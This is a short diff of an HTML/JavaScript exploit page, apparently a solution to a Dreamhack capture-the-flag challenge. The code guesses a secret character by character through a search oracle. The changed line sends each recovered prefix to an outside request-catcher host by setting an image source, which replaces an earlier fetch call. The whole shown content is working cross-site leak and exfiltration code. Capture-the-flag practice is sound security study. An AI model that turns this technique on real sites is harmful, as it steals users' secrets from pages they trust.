@@ -1,6 +1,5 @@
-<html>
-    <body></body>
-</html>
+<body></body>
+<img id="img">
 
 
 <script>
@@ -38,7 +37,7 @@ async function exploit() {
         for (let c of chars) {
             if (await search(secret + c)) {
                 secret += c;
-                fetch(`https://exttwag.request.dreamhack.games/${secret}`).then((response) => "");
+                img.src = `https://exttwag.request.dreamhack.games/${secret}`;
                 break;
             }
         }
